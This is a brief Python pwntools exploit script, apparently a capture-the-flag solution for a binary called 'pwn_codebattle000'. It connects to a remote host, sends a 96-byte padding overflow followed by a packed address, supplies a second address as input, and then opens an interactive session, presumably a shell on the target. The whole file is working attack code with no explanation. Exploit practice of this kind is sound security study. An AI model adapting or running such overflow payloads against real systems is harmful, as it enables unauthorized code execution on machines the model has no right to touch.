from pwn import *

r=remote("103.53.198.167", 33334)
#r=process("pwn_codebattle000")
r.sendline(96*"A"+p32( 0x804A010))
print str(0x0804865B)
r.sendline(str(0x0804865B))
r.interactive()
